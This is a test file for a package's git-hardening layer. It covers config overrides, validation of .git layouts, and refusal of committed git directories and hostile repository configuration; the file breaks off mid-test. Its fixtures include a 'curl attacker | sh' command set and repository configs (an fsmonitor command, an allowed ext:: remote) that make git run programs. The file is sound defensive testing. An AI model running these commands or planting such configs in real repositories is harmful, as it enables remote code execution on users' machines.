/**
 * What every git call of the package shares: the config overrides, the graft
 * switch, and the check on the git directory of the repository in use. The
 * digest and intake are exercised here; the lint has its own cases in
 * `test/lint/git-hardening.test.ts`.
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import process from "node:process";
import { fileURLToPath } from "node:url";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
  MAX_GITFILE_BYTES,
  REPO_LAYOUT_ARGS,
  applyGitSwitches,
  gitConfigOverrides,
  gitDirProblem,
  parseRepoLayout,
} from "../../src/canonical/git-hardening.js";
import { gitEnv, runGit } from "../../src/intake/git.js";
import {
  COMMANDS_FILE,
  git,
  makeRepo,
  runBounded,
  shimCalls,
  shimGit,
  tempDir,
} from "./helpers.js";

const cliPath = fileURLToPath(new URL("../../dist/cli.js", import.meta.url));
/** The built module, for a check that runs in a child process. */
const builtHardening = new URL(
  "../../dist/canonical/git-hardening.js",
  import.meta.url,
).href;
const fixtures = fileURLToPath(
  new URL("../fixtures/golden-digest/", import.meta.url),
);
const expected = JSON.parse(
  fs.readFileSync(path.join(fixtures, "expected.json"), "utf8"),
) as { base: string };
const baseCommands = fs.readFileSync(
  path.join(fixtures, "repo", COMMANDS_FILE),
  "utf8",
);
const baseSpec = fs.readFileSync(path.join(fixtures, "base/spec.md"), "utf8");
const baseRef = /^commands_ref: ([0-9a-f]+)$/m.exec(baseSpec)![1]!;
const EVIL =
  'commands:\n  typecheck:\n    argv: ["sh", "-c", "curl attacker | sh"]\n';

const cli = (args: string[], cwd: string) =>
  runBounded(process.execPath, [cliPath, ...args], { cwd });

const plainEnv = (): NodeJS.ProcessEnv =>
  Object.fromEntries(
    Object.entries(process.env).filter(([k]) => !k.startsWith("GIT_")),
  );

let scratch = "";
beforeAll(() => {
  scratch = tempDir("spec-gate-hardening-");
});
afterAll(() => {
  if (scratch !== "") fs.rmSync(scratch, { recursive: true, force: true });
});

/** A repository whose first commit is the `commands_ref` of the golden spec, with that spec inside it. */
async function goldenRepo(): Promise<{ repo: string; spec: string }> {
  const made = await makeRepo(scratch, [
    [{ path: COMMANDS_FILE, content: baseCommands }],
  ]);
  expect(made.shas[0]).toBe(baseRef);
  const spec = path.join(made.dir, "specs", "golden-sample");
  fs.mkdirSync(path.dirname(spec), { recursive: true });
  fs.cpSync(path.join(fixtures, "base"), spec, { recursive: true });
  return { repo: made.dir, spec };
}

describe("the shared overrides", () => {
  it("four -c pairs for a read, three for a call that fetches", () => {
    expect(gitConfigOverrides()).toEqual([
      "-c",
      "safe.bareRepository=explicit",
      "-c",
      "core.fsmonitor=false",
      "-c",
      `core.hooksPath=${os.devNull}`,
      "-c",
      "protocol.allow=never",
    ]);
    expect(gitConfigOverrides({ fetching: false })).toEqual(
      gitConfigOverrides(),
    );
    expect(gitConfigOverrides({})).toEqual(gitConfigOverrides());
    expect(gitConfigOverrides({ fetching: true })).toEqual([
      "-c",
      "safe.bareRepository=explicit",
      "-c",
      "core.fsmonitor=false",
      "-c",
      `core.hooksPath=${os.devNull}`,
    ]);
  });

  it("no transport is allowed by default, whatever the repository says; only a fetching call leaves that to the configuration", () => {
    const base = {
      GIT_GRAFT_FILE: os.devNull,
      GIT_NO_LAZY_FETCH: "1",
      GIT_NO_REPLACE_OBJECTS: "1",
      GIT_OPTIONAL_LOCKS: "0",
      GIT_TERMINAL_PROMPT: "0",
    };
    const byDefault: NodeJS.ProcessEnv = {};
    applyGitSwitches(byDefault);
    expect(byDefault).toEqual({ ...base, GIT_ALLOW_PROTOCOL: "" });
    // the empty string is a value, not an absent variable
    expect(Object.keys(byDefault)).toContain("GIT_ALLOW_PROTOCOL");
    const notFetching: NodeJS.ProcessEnv = {};
    applyGitSwitches(notFetching, { fetching: false });
    expect(notFetching).toEqual({ ...base, GIT_ALLOW_PROTOCOL: "" });
    const fetching: NodeJS.ProcessEnv = {};
    applyGitSwitches(fetching, { fetching: true });
    expect(fetching).toEqual(base);
  });
});

describe("gitDirProblem and parseRepoLayout", () => {
  const noEntry = "its work tree has no .git entry";
  const linkEntry = "the .git entry of its work tree is a symbolic link";
  const oddEntry =
    "the .git entry of its work tree is neither a directory nor a file";
  const notGitfile = "the .git file of its work tree is not a gitdir file";
  const elsewhere =
    "the .git entry of its work tree does not lead to its git directory";
  const commonInside = "its common git directory lies inside the work tree";

  /**
   * A fresh work tree `top` and a directory `out` next to it; `t` and `o`
   * make a directory below the one or the other and return its path.
   */
  function pair() {
    const base = fs.realpathSync(fs.mkdtempSync(path.join(scratch, "layout-")));
    const below = (root: string) => (rel: string) => {
      const dir = path.join(root, rel);
      fs.mkdirSync(dir, { recursive: true });
      return dir;
    };
    const top = below(base)("top");
    const out = below(base)("out");
    /** Makes `text` the content of the file `<top>/.git`. */
    const gitfile = (text: string | Buffer, work = top) => {
      fs.rmSync(path.join(work, ".git"), { recursive: true, force: true });
      fs.writeFileSync(path.join(work, ".git"), text);
    };
    return { top, out, t: below(top), o: below(out), gitfile };
  }

  it("part 1: a work tree without a .git entry is refused, wherever the git directory lies", () => {
    const { top, t, o } = pair();
    // the git directory is the work tree itself (core.worktree = .)
    expect(gitDirProblem(top, top, top)).toBe(noEntry);
    // the git directory holds the work tree (core.worktree = a subdirectory)
    expect(gitDirProblem(t("s1"), top, top)).toBe(noEntry);
    // the git directory lies in the work tree under another name
    expect(gitDirProblem(top, t("gitstore"), t("gitstore"))).toBe(noEntry);
    // the git directory lies next to the work tree (two layouts that name each other)
    expect(gitDirProblem(top, o("lb"), o("lb"))).toBe(noEntry);
    // control: the entry is what was missing
    expect(gitDirProblem(top, t(".git"), t(".git"))).toBeNull();
  });

  it("part 1: a .git that is a symbolic link is refused, also one that points at the git directory", () => {
    const { top, o, gitfile } = pair();
    const store = o("store");
    const entry = path.join(top, ".git");
    fs.symlinkSync(store, entry);
    expect(gitDirProblem(top, store, store)).toBe(linkEntry);
    // a link to a gitdir file, and a link to nothing
    fs.rmSync(entry);
    fs.writeFileSync(path.join(o("files"), "gitfile"), `gitdir: ${store}\n`);
    fs.symlinkSync(path.join(o("files"), "gitfile"), entry);
    expect(gitDirProblem(top, store, store)).toBe(linkEntry);
    fs.rmSync(entry);
    fs.symlinkSync(path.join(o("files"), "gone"), entry);
    expect(gitDirProblem(top, store, store)).toBe(linkEntry);
    // control: the gitdir file itself at that name is accepted
    gitfile(`gitdir: ${store}\n`);
    expect(gitDirProblem(top, store, store)).toBeNull();
  });

  it("part 2: a .git that is neither a directory nor a file is refused without being read", async () => {
    const { top, o } = pair();
    const store = o("store");
    const made = await runBounded("mkfifo", [path.join(top, ".git")]);
    expect(made.code).toBe(0);
    // In a child with a time limit: a read of the FIFO would never return.
    const run = await runBounded(
      process.execPath,
      [
        "--input-type=module",
        "-e",
        `import { gitDirProblem } from ${JSON.stringify(builtHardening)};
         process.stdout.write(String(gitDirProblem(...process.argv.slice(1))));`,
        top,
        store,
        store,
      ],
      { timeoutMs: 10_000 },
    );
    expect(run.timedOut).toBe(false);
    expect(run.stderr).toBe("");
    expect(run.stdout).toBe(oddEntry);
    // above the child's time limit, so its group kill fires before vitest gives up
  }, 30_000);

  it("part 2, a directory: <top>/.git must be the git directory git reported", () => {
    const { top, t, o } = pair();
    const dotGit = t(".git");
    expect(gitDirProblem(top, dotGit, dotGit)).toBeNull();
    // a work tree with a .git of its own that a layout elsewhere names as its work tree
    expect(gitDirProblem(top, o("la"), o("la"))).toBe(elsewhere);
    expect(gitDirProblem(top, t("specs"), t("specs"))).toBe(elsewhere);
    // a directory below .git is not .git
    expect(gitDirProblem(top, t(".git/inner"), t(".git/inner"))).toBe(
      elsewhere,
    );
  });

  it("part 2, a gitdir file: its path must be the git directory git reported, a relative one counted from the work tree", () => {
    const { top, o, gitfile } = pair();
    const dir = o("main/.git/worktrees/w");
    const common = o("main/.git");
    const relative = path.relative(top, dir);
    expect(path.isAbsolute(relative)).toBe(false);
    for (const text of [
      `gitdir: ${dir}\n`,
      `gitdir: ${dir}`,
      `gitdir: ${dir}\r\n`,
      `gitdir: ${dir}\n\n`,
      `gitdir: ${relative}\n`,
    ]) {
      gitfile(text);
      expect(gitDirProblem(top, dir, common), JSON.stringify(text)).toBeNull();
      // the same file does not lead to any other git directory
      expect(gitDirProblem(top, o("la"), o("la")), JSON.stringify(text)).toBe(
        elsewhere,
      );
    }
    // a relative path is not counted from the directory of the process
    const fromCwd = path.relative(process.cwd(), dir);
    expect(fromCwd).not.toBe(relative);
    gitfile(`gitdir: ${fromCwd}\n`);
    expect(gitDirProblem(top, dir, common)).toBe(elsewhere);
    // a path that does not exist leads nowhere
    gitfile("gitdir: ../out/gone\n");
    expect(gitDirProblem(top, dir, common)).toBe(elsewhere);
    // the path ends at the line ends that close the file, not at the first one
    gitfile(`gitdir: ${dir}\nmore\n`);
    expect(gitDirProblem(top, dir, common)).toBe(elsewhere);
  });

  it("part 2: a .git file that is not a gitdir file is refused", () => {
    const { top, o, gitfile } = pair();
    const store = o("store");
    for (const text of [
      "",
      "ref: refs/heads/main\n",
      // eight characters that are not the prefix, then the right path
      `GITDIR: ${store}\n`,
      `gitdir:\t${store}\n`,
      ` gitdir:${store}\n`,
    ]) {
      gitfile(text);
      expect(gitDirProblem(top, store, store), JSON.stringify(text)).toBe(
        notGitfile,
      );
    }
    // no path: the work tree itself must not count as the directory it names
    for (const text of ["gitdir: ", "gitdir: \n", "gitdir: \r\n\n"]) {
      gitfile(text);
      expect(gitDirProblem(top, top, store), JSON.stringify(text)).toBe(
        notGitfile,
      );
    }
  });

  it("part 2: a .git file over the size limit is not read, one at the limit is", () => {
    const { top, o, gitfile } = pair();
    const store = o("store");
    const head = `gitdir: ${store}`;
    const padded = (bytes: number) =>
      Buffer.from(head + "\n".repeat(bytes - Buffer.byteLength(head)));
    gitfile(padded(MAX_GITFILE_BYTES));
    expect(fs.statSync(path.join(top, ".git")).size).toBe(MAX_GITFILE_BYTES);
    expect(gitDirProblem(top, store, store)).toBeNull();
    gitfile(padded(MAX_GITFILE_BYTES + 1));
    expect(gitDirProblem(top, store, store)).toBe(notGitfile);
  });

  it.skipIf(process.getuid?.() === 0)(
    "part 2: a .git file that cannot be read is refused",
    () => {
      const { top, o, gitfile } = pair();
      const store = o("store");
      gitfile(`gitdir: ${store}\n`);
      expect(gitDirProblem(top, store, store)).toBeNull();
      fs.chmodSync(path.join(top, ".git"), 0o000);
      expect(gitDirProblem(top, store, store)).toBe(notGitfile);
    },
  );

  it("part 3: the common directory must be outside the work tree, unless it is <top>/.git itself", () => {
    const { top, t, o, gitfile } = pair();
    // a linked worktree: git directory and common directory outside
    const dir = o("main/.git/worktrees/w");
    gitfile(`gitdir: ${dir}\n`);
    expect(gitDirProblem(top, dir, o("main/.git"))).toBeNull();
    // the same with a common directory inside the work tree
    expect(gitDirProblem(top, dir, t("common"))).toBe(commonInside);
    // a separate git directory inside the work tree is its own common
    // directory, but it is not <top>/.git
    const inner = t("gitstore");
    gitfile(`gitdir: ${inner}\n`);
    expect(gitDirProblem(top, inner, inner)).toBe(commonInside);
    gitfile("gitdir: gitstore\n");
    expect(gitDirProblem(top, inner, inner)).toBe(commonInside);
    // <top>/.git is the git directory: fine as its own common directory,
    // refused with another directory of the work tree as the common one
    fs.rmSync(path.join(top, ".git"));
    const dotGit = t(".git");
    expect(gitDirProblem(top, dotGit, dotGit)).toBeNull();
    expect(gitDirProblem(top, dotGit, t("common"))).toBe(commonInside);
  });

  it("a work tree inside its common directory is accepted: a linked worktree of a bare repository, and one inside the main work tree", () => {
    const { o, gitfile } = pair();
    // proj.git is bare, proj.git/main its linked worktree
    const bare = o("proj.git");
    const inBare = o("proj.git/main");
    const bareDir = o("proj.git/worktrees/main");
    gitfile(`gitdir: ${bareDir}\n`, inBare);
    expect(gitDirProblem(inBare, bareDir, bare)).toBeNull();
    // main/.git is the repository, main/inner a linked worktree of it
    const inMain = o("main/inner");
    const mainDir = o("main/.git/worktrees/inner");
    gitfile(`gitdir: ${mainDir}\n`, inMain);
    expect(gitDirProblem(inMain, mainDir, o("main/.git"))).toBeNull();
  });

  it("compares real paths: a link in the work tree path, in the gitdir file or in what git reported", () => {
    const { top, out, t, o, gitfile } = pair();
    const dotGit = t(".git");
    const topLink = path.join(out, "link-to-top");
    fs.symlinkSync(top, topLink);
    expect(gitDirProblem(topLink, dotGit, dotGit)).toBeNull();
    expect(
      gitDirProblem(
        topLink,
        path.join(topLink, ".git"),
        path.join(topLink, ".git"),
      ),
    ).toBeNull();
    // the gitdir file names the git directory through a link
    fs.rmSync(dotGit, { recursive: true });
    const store = o("store");
    const storeLink = path.join(out, "link-to-store");
    fs.symlinkSync(store, storeLink);
    gitfile(`gitdir: ${storeLink}\n`);
    expect(gitDirProblem(top, store, store)).toBeNull();
    expect(gitDirProblem(top, storeLink, storeLink)).toBeNull();
    // a link into the work tree is inside it
    const inner = t("common");
    const innerLink = path.join(out, "link-into-top");
    fs.symlinkSync(inner, innerLink);
    expect(gitDirProblem(top, store, innerLink)).toBe(commonInside);
  });

  it("a path that cannot be resolved is a problem, not a pass", () => {
    const { top, out, t } = pair();
    const gone = path.join(out, "does-not-exist");
    const present = t(".git");
    expect(gitDirProblem(top, present, present)).toBeNull();
    for (const args of [
      [gone, present, present],
      [top, gone, present],
      [top, present, gone],
    ] as const) {
      expect(gitDirProblem(...args)).toBe(
        "its git directory cannot be resolved",
      );
    }
  });

  it("parses exactly three lines and nothing else", () => {
    expect(parseRepoLayout("/a\n/a/.git\n/a/.git\n")).toEqual({
      toplevel: "/a",
      gitDir: "/a/.git",
      commonDir: "/a/.git",
    });
    expect(parseRepoLayout("/a\n/a/.git\n/a/.git")).not.toBeNull();
    for (const bad of [
      "",
      "\n",
      "/a\n/a/.git\n",
      "/a\n\n/a/.git\n",
      "/a\n/b\n/c\n/d\n",
    ]) {
      expect(parseRepoLayout(bad), JSON.stringify(bad)).toBeNull();
    }
    expect(REPO_LAYOUT_ARGS).toEqual([
      "rev-parse",
      "--show-toplevel",
      "--absolute-git-dir",
      "--path-format=absolute",
      "--git-common-dir",
    ]);
  });
});

/**
 * Makes `layout` a git directory as a commit can carry one: `HEAD`,
 * `objects/` (those of the repository `from`), `refs/` with `main` at `x`,
 * and a `config` whose `core.worktree` is `worktree`.
 */
function writeLayout(
  layout: string,
  from: string,
  x: string,
  worktree: string,
): void {
  fs.cpSync(path.join(from, ".git", "objects"), path.join(layout, "objects"), {
    recursive: true,
  });
  fs.writeFileSync(path.join(layout, "HEAD"), "ref: refs/heads/main\n");
  fs.mkdirSync(path.join(layout, "refs/heads"), { recursive: true });
  fs.writeFileSync(path.join(layout, "refs/heads/main"), `${x}\n`);
  fs.writeFileSync(
    path.join(layout, "config"),
    `[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = ${worktree}\n`,
  );
}

/**
 * A spec pull request that carries a git directory of its own: `specs/` of
 * the repository `repo` holds `HEAD`, `objects/`, `refs/` and a `config` of a
 * repository the author built (one commit `x` with their own command set),
 * and `specs/evil-spec` is a spec that names `x` as its `commands_ref`.
 * `worktree` is the `core.worktree` of the layout: `.` makes `specs/` its own
 * work tree, `evil-spec` puts the work tree below the git directory, any
 * other path names a work tree somewhere else, and `AUTHORS_CHECKOUT` stands
 * for the directory of the author's own repository.
 */
const AUTHORS_CHECKOUT = "<the author's checkout>";

async function embedLayout(
  repo: string,
  spec: string,
  worktree: string,
): Promise<{ x: string; evil: string; attacker: { dir: string } }> {
  const attacker = await makeRepo(scratch, [
    [{ path: COMMANDS_FILE, content: EVIL }],
  ]);
  const x = attacker.shas[0]!;
  writeLayout(
    path.join(repo, "specs"),
    attacker.dir,
    x,
    worktree === AUTHORS_CHECKOUT ? attacker.dir : worktree,
  );
  const evil = path.join(repo, "specs", "evil-spec");
  fs.cpSync(spec, evil, { recursive: true });
  fs.writeFileSync(path.join(evil, "spec.md"), baseSpec.replace(baseRef, x));
  return { x, evil, attacker };
}

describe("spec-gate digest and a hostile repository", () => {
  it("a git directory committed into the work tree is not found from the spec directory", async () => {
    const { repo, spec } = await goldenRepo();
    // the author's repository: a commit with their own command set at the id the spec names
    const { evil, attacker } = await embedLayout(repo, spec, ".");
    // control: the digest of the attacker's spec is computable from their layout
    const control = await runBounded(
      process.execPath,
      [cliPath, "digest", evil, "--repo", attacker.dir],
      { cwd: scratch },
    );
    expect(control.code).toBe(0);

    const found = await cli(["digest", evil], scratch);
    expect(found.code).toBe(1);
    expect(found.stdout).toBe("");
    // git's own bare-repository rule refuses the layout first
    expect(found.stderr).toContain("[repo-not-found]");
    expect(found.stderr).not.toContain(control.stdout.trim());
    // the real repository in use with --repo still works, the layout notwithstanding
    const real = await cli(["digest", spec, "--repo", repo], scratch);
    expect(real.stderr).toBe("");
    expect(real.code).toBe(0);
    expect(real.stdout.trim()).toBe(expected.base);
    // without --repo the same layout is found first and refused
    const viaDefault = await cli(["digest", spec], scratch);
    expect(viaDefault.code).toBe(1);
    expect(viaDefault.stdout).toBe("");
  });

  const noEntry = "its work tree has no .git entry";
  const elsewhere =
    "the .git entry of its work tree does not lead to its git directory";

  /**
   * Committed layouts: the `core.worktree` of the one in `specs/`, the work
   * tree git makes of it (`top`, below the checkout root, or
   * `AUTHORS_CHECKOUT`) and the part of the rule that refuses it. `next`
   * names what lies next to `specs/`: a second layout `lb` whose
   * `core.worktree` is `../specs`, or a plain directory `plain`.
   */
  const layouts: Array<{
    name: string;
    worktree: string;
    top: string;
    why: string;
    next?: "lb" | "plain";
  }> = [
    { name: "core.worktree = .", worktree: ".", top: "specs", why: noEntry },
    {
      name: "core.worktree = evil-spec",
      worktree: "evil-spec",
      top: "specs/evil-spec",
      why: noEntry,
    },
    {
      name: "two layouts whose core.worktree name each other",
      worktree: "../lb",
      top: "lb",
      why: noEntry,
      next: "lb",
    },
    {
      name: "core.worktree = a plain directory next to the layout",
      worktree: "../plain",
      top: "plain",
      why: noEntry,
      next: "plain",
    },
    {
      name: "core.worktree = another checkout on the machine",
      worktree: AUTHORS_CHECKOUT,
      top: AUTHORS_CHECKOUT,
      why: elsewhere,
    },
    {
      name: "core.worktree = the checkout root",
      worktree: "..",
      top: ".",
      why: elsewhere,
    },
  ];

  for (const layout of layouts) {
    it(`the layout check refuses a committed git directory on a git that ignores safe.bareRepository (${layout.name})`, async () => {
      const { repo, spec } = await goldenRepo();
      const { x, evil, attacker } = await embedLayout(
        repo,
        spec,
        layout.worktree,
      );
      if (layout.next === "lb") {
        writeLayout(path.join(repo, "lb"), attacker.dir, x, "../specs");
      }
      if (layout.next === "plain") fs.mkdirSync(path.join(repo, "plain"));
      const top =
        layout.top === AUTHORS_CHECKOUT
          ? attacker.dir
          : path.join(repo, layout.top);
      const control = await runBounded(
        process.execPath,
        [cliPath, "digest", evil, "--repo", attacker.dir],
        { cwd: scratch },
      );
      expect(control.code).toBe(0);
      expect(control.stdout).toMatch(/^sha256:[0-9a-f]{64}\n$/);
      const shim = shimGit(scratch, { drop: ["safe.bareRepository=explicit"] });
      const env = { ...process.env, PATH: shim.path };
      // control: through this git the layout is found from the spec
      // directory, and its work tree is the one its configuration names
      const raw = await runBounded("git", ["-C", evil, ...REPO_LAYOUT_ARGS], {
        env: { ...plainEnv(), PATH: shim.path },
      });
      expect(raw.code).toBe(0);
      expect(raw.stdout.split("\n").slice(0, 2)).toEqual([
        fs.realpathSync(top),
        fs.realpathSync(path.join(repo, "specs")),
      ]);
      fs.rmSync(shim.log);
      const found = await runBounded(
        process.execPath,
        [cliPath, "digest", evil],
        { cwd: scratch, env },
      );
      // the setting was dropped, so git's own refusal did not come first
      expect(found.stderr).not.toContain("[repo-not-found]");
      expect(found.stderr).toContain("[repo-invalid]");
      expect(found.stderr).toContain(layout.why);
      expect(found.stdout).toBe("");
      expect(found.code).toBe(1);
      // git was reached, and no call carried the dropped setting
      const calls = shimCalls(shim.log);
      expect(calls.some((c) => c.includes("--absolute-git-dir"))).toBe(true);
      expect(
        calls.some((c) => c.includes("safe.bareRepository=explicit")),
      ).toBe(false);
    });
  }

  it("a separate git directory inside the work tree is an error, with and without --repo", async () => {
    const { repo, spec } = await goldenRepo();
    fs.renameSync(path.join(repo, ".git"), path.join(repo, "gitstore"));
    fs.writeFileSync(path.join(repo, ".git"), "gitdir: gitstore\n");
    for (const args of [[spec], [spec, "--repo", repo]]) {
      const run = await cli(["digest", ...args], scratch);
      expect(run.code, args.join(" ")).toBe(1);
      expect(run.stdout, args.join(" ")).toBe("");
      expect(run.stderr, args.join(" ")).toContain("[repo-invalid]");
      expect(run.stderr, args.join(" ")).toContain(
        "its common git directory lies inside the work tree",
      );
    }
  });

  it("a separate git directory outside the work tree is accepted; a .git that is a link to it is refused", async () => {
    const { repo, spec } = await goldenRepo();
    const store = path.join(
      fs.mkdtempSync(path.join(scratch, "separate-")),
      "store",
    );
    // git moves the repository there and leaves a gitdir file behind
    await git(repo, ["init", "-q", "--separate-git-dir", store]);
    expect(fs.statSync(path.join(repo, ".git")).isFile()).toBe(true);
    expect(fs.existsSync(path.join(store, "HEAD"))).toBe(true);
    for (const args of [[spec], [spec, "--repo", repo]]) {
      const run = await cli(["digest", ...args], scratch);
      expect(run.stderr, args.join(" ")).toBe("");
      expect(run.code, args.join(" ")).toBe(0);
      expect(run.stdout.trim(), args.join(" ")).toBe(expected.base);
    }
    fs.rmSync(path.join(repo, ".git"));
    fs.symlinkSync(store, path.join(repo, ".git"));
    // control: git itself takes the link for the repository
    expect(await git(repo, ["rev-parse", "HEAD"])).toBe(baseRef);
    for (const args of [[spec], [spec, "--repo", repo]]) {
      const run = await cli(["digest", ...args], scratch);
      expect(run.code, args.join(" ")).toBe(1);
      expect(run.stdout, args.join(" ")).toBe("");
      expect(run.stderr, args.join(" ")).toContain("[repo-invalid]");
      expect(run.stderr, args.join(" ")).toContain(
        "the .git entry of its work tree is a symbolic link",
      );
    }
  });

  it("a linked worktree inside a bare repository is accepted, from the spec directory and with --repo", async () => {
    const { repo, spec } = await goldenRepo();
    await git(repo, ["add", "-A"]);
    await git(repo, ["commit", "-q", "-m", "spec"], 2);
    const bare = path.join(
      fs.mkdtempSync(path.join(scratch, "bare-")),
      "proj.git",
    );
    await git(scratch, ["clone", "-q", "--bare", repo, bare]);
    await git(bare, ["worktree", "add", "-q", "--detach", "main", "HEAD"]);
    const work = path.join(bare, "main");
    const inWork = path.join(work, "specs", "golden-sample");
    // the layout: the work tree lies inside the common directory
    const raw = await runBounded("git", ["-C", work, ...REPO_LAYOUT_ARGS], {
      env: plainEnv(),
    });
    expect(raw.stdout.trim().split("\n")).toEqual([
      fs.realpathSync(work),
      fs.realpathSync(path.join(bare, "worktrees", "main")),
      fs.realpathSync(bare),
    ]);
    for (const args of [
      [inWork],
      [inWork, "--repo", work],
      [inWork, "--repo", inWork],
    ]) {
      const run = await cli(["digest", ...args], scratch);
      expect(run.stderr, args.join(" ")).toBe("");
      expect(run.code, args.join(" ")).toBe(0);
      expect(run.stdout.trim(), args.join(" ")).toBe(expected.base);
    }
    // the bare repository itself is still not a work tree
    const viaBare = await cli(["digest", inWork, "--repo", bare], scratch);
    expect(viaBare.code).toBe(1);
    expect(viaBare.stderr).toContain("[repo-invalid]");
    expect(spec).toBeTruthy();
  });

  it("a linked worktree is accepted, one whose common directory lies inside it is refused", async () => {
    const { repo, spec } = await goldenRepo();
    await git(repo, ["add", "-A"]);
    await git(repo, ["commit", "-q", "-m", "spec"], 2);
    const linked = path.join(scratch, "linked-wt");
    await git(repo, ["worktree", "add", "-q", "--detach", linked, "HEAD"]);
    const inLinked = path.join(linked, "specs", "golden-sample");
    expect(fs.existsSync(path.join(inLinked, "spec.md"))).toBe(true);
    const ok = await cli(["digest", inLinked], scratch);
    expect(ok.stderr).toBe("");
    expect(ok.code).toBe(0);

    const inner = path.join(linked, "common");
    fs.cpSync(path.join(repo, ".git"), inner, { recursive: true });
    const wt = path.join(repo, ".git", "worktrees");
    const dir = path.join(wt, fs.readdirSync(wt)[0]!);
    fs.writeFileSync(path.join(dir, "commondir"), `${inner}\n`);
    const bad = await cli(["digest", inLinked, "--repo", linked], scratch);
    expect(bad.code).toBe(1);
    expect(bad.stdout).toBe("");
    expect(bad.stderr).toContain(
      "its common git directory lies inside the work tree",
    );
    expect(spec).toBeTruthy();
  });

  /**
   * The setting of the checkout's own configuration that a git call of this
   * package can trigger: `core.fsmonitor` runs when git reads the index, as
   * `diff-tree` does (intake's call). Measured against plain git, none of
   * the digest's commands (`rev-parse`, `cat-file`, `ls-tree`) starts a
   * program named by an fsmonitor, diff driver, pager, hook, ssh command or
   * alternate-refs command, so there is no behaviour fixture for the digest
   * that could fire; the arguments of its calls are asserted instead, below.
   * The other settings are not part of this fixture for the same reason.
   */
  async function hostile(repo: string): Promise<string> {
    const markers = fs.mkdtempSync(path.join(scratch, "markers-"));
    await git(repo, [
      "config",
      "core.fsmonitor",
      `touch ${markers}/fsmonitor; false`,
    ]);
    return markers;
  }

  const left = (markers: string) => fs.readdirSync(markers);

  it("intake's git calls do not run the file system monitor program the repository names, and carry no transport switch of their own", async () => {
    const { repo } = await goldenRepo();
    await git(repo, ["commit", "-q", "--allow-empty", "-m", "two"], 2);
    const markers = await hostile(repo);
    // control: the fixture is live, a plain git starts the program when it reads the index
    const control = await runBounded(
      "git",
      ["-C", repo, "diff-tree", "-r", "--name-only", baseRef, "HEAD"],
      { env: plainEnv() },
    );
    expect(control.code).toBe(0);
    expect(left(markers)).toContain("fsmonitor");
    for (const name of left(markers)) fs.rmSync(path.join(markers, name));
    const run = await runGit(repo, [
      "diff-tree",
      "-r",
      "--name-only",
      baseRef,
      "HEAD",
    ]);
    expect(run.status).toBe(0);
    expect(left(markers)).toEqual([]);
    expect(gitEnv()["GIT_GRAFT_FILE"]).toBe(os.devNull);
    expect(Object.keys(gitEnv())).not.toContain("GIT_ALLOW_PROTOCOL");
  });

  /** What goes between `-C <dir>` and the subcommand of every git call. */
  const OVERRIDES = [
    "-c",
    "safe.bareRepository=explicit",
    "-c",
    "core.fsmonitor=false",
    "-c",
    `core.hooksPath=${os.devNull}`,
    "-c",
    "protocol.allow=never",
  ];

  it("every git call of the digest carries the four overrides", async () => {
    const { repo, spec } = await goldenRepo();
    const shim = shimGit(scratch);
    const run = await runBounded(
      process.execPath,
      [cliPath, "digest", spec, "--repo", repo],
      { cwd: scratch, env: { ...process.env, PATH: shim.path } },
    );
    expect(run.stderr).toBe("");
    expect(run.code).toBe(0);
    const calls = shimCalls(shim.log);
    // every kind of call the digest makes is in the log
    const subcommands = new Set(calls.map((c) => c[2 + OVERRIDES.length]));
    expect([...subcommands].sort()).toEqual([
      "cat-file",
      "ls-tree",
      "rev-parse",
    ]);
    for (const call of calls) {
      expect(call[0], call.join(" ")).toBe("-C");
      expect(call.slice(2, 2 + OVERRIDES.length), call.join(" ")).toEqual(
        OVERRIDES,
      );
    }
  });

  it("a repository's protocol.<name>.allow does not start a transport for a read of the digest", async () => {
    const { repo, spec } = await goldenRepo();
    await git(repo, ["add", "-A"]);
    await git(repo, ["commit", "-q", "-m", "spec"], 2);
    const markers = fs.mkdtempSync(path.join(scratch, "ext-markers-"));
    const marker = path.join(markers, "ext-transport");
    // a promisor remote over ext:: that the repository itself allows
    await git(repo, ["config", "core.repositoryformatversion", "1"]);
    await git(repo, ["config", "extensions.partialClone", "evil"]);
    await git(repo, [
      "config",
      "remote.evil.url",
      `ext::sh -c touch% ${marker}`,
    ]);
    await git(repo, ["config", "remote.evil.promisor", "true"]);
    await git(repo, ["config", "remote.evil.partialclonefilter", "blob:none"]);
    await git(repo, ["config", "protocol.ext.allow", "always"]);
    // an id the repository does not hold
    const missing = "abcdefabcdefabcdefabcdefabcdefabcdefabcd";
    const lazy = shimGit(scratch, { unset: ["GIT_NO_LAZY_FETCH"] });
    // control: plain git asks the promisor remote for the missing object,
    // and with only the four overrides of the package it still does
    const probe = (extra: string[], env: NodeJS.ProcessEnv) =>
      runBounded(
        "git",
        ["-C", repo, ...extra, "cat-file", "-t", "--end-of-options", missing],
        { env },
      );
    await probe([], plainEnv());
    expect(fs.existsSync(marker)).toBe(true);
    fs.rmSync(marker);
    await probe(gitConfigOverrides(), plainEnv());
    expect(fs.existsSync(marker)).toBe(true);
    fs.rmSync(marker);

    const evil = path.join(repo, "specs", "evil-spec");
    fs.cpSync(spec, evil, { recursive: true });
    fs.writeFileSync(
      path.join(evil, "spec.md"),
      baseSpec.replace(baseRef, missing),
    );
    const run = await runBounded(
      process.execPath,
      [cliPath, "digest", evil, "--repo", repo],
      { cwd: scratch, env: { ...process.env, PATH: lazy.path } },
    );
    expect(run.code).toBe(1);
    expect(run.stderr).toContain("[commands-ref-unresolvable]");
    expect(fs.existsSync(marker)).toBe(false);
  });
});

describe("a git stopped by a signal", () => {
  const saved = process.env["PATH"];
  afterEach(() => {
    process.env["PATH"] = saved;
  });

  /** A `git` first on PATH that kills itself when a call holds the argument `needle`. */
  function killingGit(needle: string): string {
    const dir = fs.mkdtempSync(path.join(scratch, "kill-shim-"));
    const real = fs.realpathSync(
      ["/usr/bin/git", "/opt/homebrew/bin/git", "/usr/local/bin/git"].find(
        (p) => fs.existsSync(p),
      )!,
    );
    fs.writeFileSync(
      path.join(dir, "git"),
      [
        "#!/bin/sh",
        'for a in "$@"; do',
        `  if [ "$a" = "${needle}" ]; then kill -KILL $$; fi`,
        "done",
        `exec "${real}" "$@"`,
        "",
      ].join("\n"),
      { mode: 0o755 },
    );
    return `${dir}${path.delimiter}${saved ?? ""}`;
  }

  it("is git-failed in the digest, never a refusal that names another error", async () => {
    const { repo, spec } = await goldenRepo();
    for (const needle of [
      "--show-toplevel",
      "--absolute-git-dir",
      "cat-file",
      "ls-tree",
    ]) {
      const run = await runBounded(
